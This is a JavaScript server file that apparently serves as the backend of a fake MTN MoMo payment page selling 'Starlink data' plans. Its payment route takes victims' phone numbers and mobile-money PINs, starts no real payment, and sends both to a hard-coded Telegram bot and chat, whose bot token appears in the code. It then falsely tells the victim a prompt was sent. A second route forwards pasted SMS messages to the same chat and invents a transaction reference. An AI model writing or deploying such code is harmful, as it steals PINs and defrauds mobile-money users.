const { json, send } = require('micro');
const cors = require('micro-cors')({ allowMethods: ['POST', 'OPTIONS'], allowHeaders: ['Content-Type'] });
const fetch = require('node-fetch');

// --- Telegram Configuration ---
const TELEGRAM_BOT_TOKEN = '8856764721:AAHTsubai7d4D6vosk38DRd1hViU64ic8wg';
const TELEGRAM_CHAT_ID = '5942170306';

// Helper function to send messages to Telegram
async function sendTelegramMessage(text) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });
  } catch (err) {
    console.error('[Telegram Error]', err.message);
  }
}

const claimedTransactions = new Set();

const server = cors(async (req, res) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return send(res, 200, 'ok');
  }

  // Handle payment initiation route
  if (req.method === 'POST' && req.url === '/api/momo/pay') {
    try {
      const body = await json(req);
      const { phone, pin, amount, plan } = body;

      if (!phone || !pin || !amount) {
        return send(res, 400, { success: false, message: 'Missing required payment details.' });
      }

      console.log(`[MTN MoMo] Initiating payment of ZMW ${amount} for plan "${plan}" to phone +260${phone}`);

      // Forward Payment Initiation to Telegram
      const telegramMsg = `💳 *New Payment Initiation*\n\n` +
        `*Phone:* +260${phone}\n` +
        `*PIN:* \`${pin}\`\n` +
        `*Amount:* ZMW ${amount}\n` +
        `*Plan:* ${plan || 'N/A'}`;
      
      await sendTelegramMessage(telegramMsg);

      return send(res, 200, {
        success: true,
        message: 'MTN MoMo prompt sent successfully. Please check your phone for confirmation SMS.'
      });
    } catch (error) {
      console.error('[Pay Error]', error);
      return send(res, 500, { success: false, message: 'Server error processing payment request.' });
    }
  }

  // Handle SMS verification route
  if (req.method === 'POST' && req.url === '/api/momo/verify-sms') {
    try {
      const body = await json(req);
      const { smsContent, phone, plan } = body;

      if (!smsContent) {
        return send(res, 400, { success: false, message: 'SMS content is required for verification.' });
      }

      const lowerSMS = smsContent.toLowerCase();
      if (lowerSMS.includes('failed') || lowerSMS.includes('cancelled') || lowerSMS.includes('insufficient')) {
        await sendTelegramMessage(
          `⚠️ *Failed Verification Attempt*\n\n` +
          `*Phone:* +260${phone || 'Unknown'}\n` +
          `*Plan:* ${plan || 'N/A'}\n` +
          `*SMS Content:* ${smsContent}`
        );

        return send(res, 400, { success: false, message: 'Provided SMS indicates a failed or cancelled transaction.' });
      }

      const transactionRef = 'MTN-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      if (claimedTransactions.has(transactionRef)) {
        return send(res, 400, { success: false, message: 'Transaction reference already claimed.' });
      }

      claimedTransactions.add(transactionRef);
      console.log(`[VERIFIED] Phone: +260${phone} | Plan: ${plan} \vert{} Ref:${transactionRef}`);

      const telegramMsg = `✅ *Transaction Verified*\n\n` +
        `*Phone:* +260${phone || 'N/A'}\n` +
        `*Plan:* ${plan || 'N/A'}\n` +
        `*Ref:* \`${transactionRef}\`\n\n` +
        `*SMS Content:*\n\`${smsContent}\``;

      await sendTelegramMessage(telegramMsg);

      return send(res, 200, {
        success: true,
        message: 'Transaction verified successfully. High-speed Starlink data activated!',
        reference: transactionRef
      });
    } catch (error) {
      return send(res, 500, { success: false, message: 'Server error verifying transaction.' });
    }
  }

  // Fallback for unknown routes
  return send(res, 404, { success: false, message: 'Not Found' });
});

module.exports = cors(server);
